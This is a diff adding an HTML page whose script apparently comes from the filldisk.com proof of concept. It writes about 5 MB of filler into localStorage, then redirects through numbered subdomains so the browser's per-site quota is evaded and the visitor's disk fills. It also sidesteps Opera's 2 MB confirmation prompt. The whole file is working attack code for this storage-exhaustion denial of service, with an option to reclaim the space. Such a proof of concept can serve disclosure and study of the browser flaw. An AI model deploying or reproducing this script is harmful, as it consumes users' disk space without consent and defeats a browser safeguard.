@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+</head>
+<body>
+<script>
+
+  /**
+   * Returns a new String that contains `count` copies of `string`
+   * concatenated together.
+   *
+   * Some code adapted from: arty.name/localstorage.html
+   */
+
+  function repeat(string, count) {
+    var array = []
+    while (count--) {
+      array.push(string)
+    }
+    return array.join('')
+  }
+
+  (function () {
+
+    /**
+     * Get the subdomain "number" of this iframe.
+     * Example: http://5.filldisk.com  -->  5
+     * @type {Number}
+     */
+
+    var frameNum = parseInt(window.location.hostname.match(/^([^.]+)\./i)[1])
+
+    /**
+     * Should we reclaim space instead of stealing it?
+     * If true, we will reclaim the space we used.
+     * @type {Boolean}
+     */
+
+    var shouldReclaim = window.location.search.match(/reclaim=(\w+)/i)
+    if (shouldReclaim) {
+      shouldReclaim = (shouldReclaim[1] == 'true')
+    }
+
+    /**
+     * Generate a 2.5 MB string.
+     * Note: This is not actually writing cat pictures to disk.
+     * (But I could do that if I wanted to.)
+     */
+
+    var n10b = '0123456789'
+    var n100b = repeat(n10b, 10)
+    var n1kb = repeat(n100b, 10)
+    var n10kb = repeat(n1kb, 10)
+    var n100kb = repeat(n10kb, 10)
+    var n999kb = repeat(n1kb, 999)
+    var n2500kb = repeat(n100kb, 25)
+
+    /**
+     * Use 5 MB of localStorage space.
+     * Used space is double the size of the string because
+     * JS uses UTF-16 Strings.
+     */
+
+    try {
+      if (shouldReclaim) {
+        localStorage['filldisk'] = ''
+        localStorage.removeItem('filldisk')
+      } else {
+        /**
+         * Opera has a limit of slightly less than 2MB
+         * above which it asks for user confirmation.
+         */
+        if (navigator.userAgent.indexOf("Opera") == -1) {
+          localStorage['filldisk'] = n2500kb
+        } else {
+          localStorage['filldisk'] = n999kb
+        }
+      }
+    } catch (e) {
+      console.error('local storage exception')
+      return
+    }
+
+    /**
+     * Notify the main frame about what subdomain we are on.
+     */
+
+    window.parent.postMessage(frameNum, '*')
+
+    /**
+     * Redirect to the next subdomain!
+     */
+
+    if (shouldReclaim && frameNum > 1) {
+      window.location = 'http://' + (frameNum - 1) + '.filldisk.com/frame.html?reclaim=' + shouldReclaim
+    } else if (!shouldReclaim) {
+      window.location = 'http://' + (frameNum + 1) + '.filldisk.com/frame.html'
+    }
+
+  })()
+
+</script>
+</body>
+</html>
